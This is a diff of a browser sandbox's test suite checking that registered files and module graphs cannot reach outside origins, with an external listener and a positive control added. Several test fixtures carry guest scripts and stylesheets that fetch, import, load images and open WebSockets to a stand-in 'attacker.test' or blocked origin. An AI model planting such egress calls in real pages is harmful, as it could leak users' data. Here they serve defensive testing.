@@ -1,5 +1,6 @@
 import { test, expect, type SandboxDriver, type FileSpec } from './fixture';
 import { MAX_TOTAL_BYTES, mimeTypeFor } from '@src/lib/files';
+import { useRecorder, wss } from './recorder';
 
 /**
  * Files (ADR-004): the host registers files on the element, every environment build snapshots them
@@ -17,6 +18,9 @@ import { MAX_TOTAL_BYTES, mimeTypeFor } from '@src/lib/files';
  *   9. module graph: registered modules import each other by relative path through one import map,
  *      a module is evaluated once however it is reached, and every unsupported form fails closed
  */
+
+// The listener outside the browser for the egress tests (sections 4 and 9, backlog T5).
+const recorder = useRecorder();
 
 // The NOT_FOUND refusal exactly as guest code sees it: a plain Error with an own code, and a message
 // that names nothing but the code.
@@ -225,16 +229,17 @@ test.describe('3. isolation between sandboxes and from the host page', () => {
 });
 
 test.describe('4. files add no egress', () => {
-    const ATTACKER = 'https://attacker.test';
-    const EGRESS_FILES: Record<string, FileSpec> = {
+    // Every attempt targets a listener outside the browser (recorder.ts), which must stay silent; the
+    // positive control (last test of this section) sends the same file's attempts to an allowlisted origin.
+    const egressFiles = (ATTACKER: string): Record<string, FileSpec> => ({
         // runs from a blob: URL, so under the guest policy: every channel must be refused
         'egress.js': `globalThis.__egress = (async () => {
             const r = {};
             r.fetch = await fetch('${ATTACKER}/fetch').then(() => 'reached', () => 'refused');
             r.import = await import('${ATTACKER}/import.js').then(() => 'reached', () => 'refused');
-            r.img = await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/img'; });
+            r.img = await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/img.svg'; });
             r.websocket = await new Promise(res => {
-                try { const w = new WebSocket('wss://attacker.test/ws'); w.onopen = () => res('reached'); w.onerror = () => res('refused'); }
+                try { const w = new WebSocket('${wss(ATTACKER)}/ws'); w.onopen = () => res('reached'); w.onerror = () => res('refused'); }
                 catch (e) { res('refused'); }
             });
             // positive control for the outcome channel: a permitted load reports success
@@ -242,17 +247,11 @@ test.describe('4. files add no egress', () => {
             return r;
         })();`,
         'import.css': `@import url("${ATTACKER}/import.css");`,
-        'background.css': `body { background-image: url("${ATTACKER}/bg.png"); }`,
-    };
+        'background.css': `body { background-image: url("${ATTACKER}/bg.svg"); }`,
+    });
 
-    test('a file run as script or applied as a stylesheet cannot reach a non-allowlisted origin: each attempt is refused AND reported as a CSP violation', async ({ sandbox, context }) => {
-        // Secondary evidence only: in Chromium the route can miss guest requests (backlog T5).
-        const routed: string[] = [];
-        await context.route(/attacker\.test/, (route) => { routed.push(route.request().url()); return route.fulfill({ body: '' }); });
-
-        expect(await sandbox.registerFiles(EGRESS_FILES)).toBe('ok');
-        expect(await sandbox.mount()).toBe('ready');
-        const r = await inGuest(sandbox, `
+    // Loads the three files and reports how each settled, with the violations the guest saw.
+    const loadEgressFiles = `
             const violations = [];
             addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
             const sheet = (path) => new Promise(res => {
@@ -274,7 +273,13 @@ test.describe('4. files add no egress', () => {
             const outcomes = await globalThis.__egress;
             await new Promise(res => setTimeout(res, 500)); // violation events are queued as tasks
             return { sheets, script, outcomes, violations: [...new Set(violations)].sort() };
-        `);
+        `;
+
+    test('a file run as script or applied as a stylesheet cannot reach a non-allowlisted origin: each attempt is refused AND reported as a CSP violation', async ({ sandbox }) => {
+        const ATTACKER = recorder.blocked;
+        expect(await sandbox.registerFiles(egressFiles(ATTACKER))).toBe('ok');
+        expect(await sandbox.mount()).toBe('ready');
+        const r = await inGuest(sandbox, loadEgressFiles);
 
         // a refused @import fails its whole sheet (an error event) in all three engines; the other sheet loads
         expect(r.sheets).toEqual({ import: 'error', background: 'loaded' });
@@ -284,13 +289,31 @@ test.describe('4. files add no egress', () => {
         // would show up as a refusal without one and fail this assertion: the evidence cannot miss it.
         expect(r.violations).toEqual([
             `connect-src ${ATTACKER}/fetch`,
-            `connect-src wss://attacker.test/ws`,
-            `img-src ${ATTACKER}/bg.png`,
-            `img-src ${ATTACKER}/img`,
+            `connect-src ${wss(ATTACKER)}/ws`,
+            `img-src ${ATTACKER}/bg.svg`,
+            `img-src ${ATTACKER}/img.svg`,
             `script-src-elem ${ATTACKER}/import.js`,
             `style-src-elem ${ATTACKER}/import.css`,
         ]);
-        expect(routed).toEqual([]);
+        expect(recorder.hits.filter(hit => hit.server === 'blocked')).toEqual([]);
+    });
+
+    test('positive control: the same files, with the listener allowlisted, load and reach it with no violation', async ({ sandbox }) => {
+        const allowed = recorder.allowed;
+        expect(await sandbox.registerFiles(egressFiles(allowed))).toBe('ok');
+        // the file types' own blob: sources are added to these directives (file-sources.ts)
+        expect(await sandbox.mount({ connectionsAllowed: {
+            'script-src': ["'unsafe-inline'", allowed],
+            'style-src': ["'unsafe-inline'", allowed],
+            'img-src': [allowed],
+            'connect-src': [allowed, wss(allowed)],
+        } })).toBe('ready');
+        const r = await inGuest(sandbox, loadEgressFiles);
+
+        expect(r.sheets).toEqual({ import: 'loaded', background: 'loaded' });
+        expect(r.outcomes).toEqual({ fetch: 'reached', import: 'reached', img: 'reached', websocket: 'reached', ownFile: 'reached' });
+        expect(r.violations).toEqual([]);
+        for (const path of ['/fetch', '/import.js', '/img.svg', '/ws', '/import.css', '/bg.svg']) await recorder.waitFor('allowed', path);
     });
 });
 
@@ -547,10 +570,10 @@ test.describe('8. markup references: guest markup that names a registered file l
         expect(rewritten.template).toBe('<img src="logo.svg">');
     });
 
-    test('an unregistered or differently spelled reference fails closed: the attribute stays as written, the load fails, and no request is made at all', async ({ sandbox, context }) => {
-        // Secondary evidence only: in Chromium the route can miss guest requests (backlog T5).
-        const requested: string[] = [];
-        context.on('request', request => { if (/missing|LOGO|%6Cogo|\?v=1|attacker/.test(request.url())) requested.push(request.url()); });
+    test('an unregistered or differently spelled reference fails closed: the attribute stays as written, the load fails, and no request is made at all', async ({ sandbox }) => {
+        // No request recording here: it could show nothing a positive control proves it would see (in
+        // Chromium Playwright misses guest-frame requests, T5). The violation channel, with its control, is
+        // the evidence that nothing was requested.
         expect(await sandbox.registerFiles({ 'logo.svg': MARKUP_FILES['logo.svg']!, 'app.js': 'window.__app = true;' })).toBe('ok');
         // relative references the host does not match: they stay relative, and cannot resolve in the guest
         const MISSES = ['missing.svg', 'logo.svg?v=1', 'logo.svg#f', 'LOGO.SVG', '%6Cogo.svg', 'img/logo.svg', '../missing.svg'];
@@ -596,7 +619,6 @@ test.describe('8. markup references: guest markup that names a registered file l
             // resolved, so nothing was requested (the guest's base is about:blank).
             violations: ['img-src https://attacker.test/x.svg', 'img-src https://vfs.invalid:8443/logo.svg'],
         });
-        expect(requested.filter(url => !url.includes('attacker'))).toEqual([]);
     });
 });
 
@@ -754,17 +776,16 @@ test.describe('9. module graph: relative imports between registered modules reso
         expect(await inGuest(sandbox, read)).toEqual({ x: 'ours', cdn: 'error:TypeError', violations: [], importMaps: 0 });
     });
 
-    test('a module graph adds no egress: modules run under the guest policy, every attempt to reach a non-allowlisted origin is refused AND reported (T5)', async ({ sandbox, context }) => {
-        // Secondary evidence only: in Chromium the route can miss guest requests (backlog T5).
-        const routed: string[] = [];
-        await context.route(/attacker\.test/, (route) => { routed.push(route.request().url()); return route.fulfill({ body: '' }); });
+    test('a module graph adds no egress: modules run under the guest policy, every attempt to reach a non-allowlisted origin is refused AND reported (T5)', async ({ sandbox }) => {
+        // the listener outside the browser must stay silent; its positive control is section 4's last test
+        const ATTACKER = recorder.blocked;
         expect(await sandbox.registerFiles({
             'egress/main.js': `import { own } from './own.js';
                 export const outcomes = (async () => ({
                     own,
-                    import: await import('${'https://attacker.test'}/m.js').then(() => 'reached', () => 'refused'),
-                    fetch: await fetch('https://attacker.test/f').then(() => 'reached', () => 'refused'),
-                    img: await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = 'https://attacker.test/i.png'; }),
+                    import: await import('${ATTACKER}/m.js').then(() => 'reached', () => 'refused'),
+                    fetch: await fetch('${ATTACKER}/f').then(() => 'reached', () => 'refused'),
+                    img: await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = '${ATTACKER}/i.svg'; }),
                 }))();`,
             'egress/own.js': "export const own = 'reached';",
         })).toBe('ok');
@@ -782,11 +803,11 @@ test.describe('9. module graph: relative imports between registered modules reso
         expect(r.outcomes).toEqual({ own: 'reached', import: 'refused', fetch: 'refused', img: 'refused' });
         // every refusal has its violation, so a request that left and merely failed would show up here
         expect(r.violations).toEqual([
-            'connect-src https://attacker.test/f',
-            'img-src https://attacker.test/i.png',
-            'script-src-elem https://attacker.test/m.js',
+            `connect-src ${ATTACKER}/f`,
+            `img-src ${ATTACKER}/i.svg`,
+            `script-src-elem ${ATTACKER}/m.js`,
         ]);
-        expect(routed).toEqual([]);
+        expect(recorder.paths('blocked')).toEqual([]);
     });
 
     test('worker mode is classic only: importScripts and read() work as before, read() returns the file as registered, and a rewritten module graph fails closed (no import map in workers)', async ({ sandbox }) => {
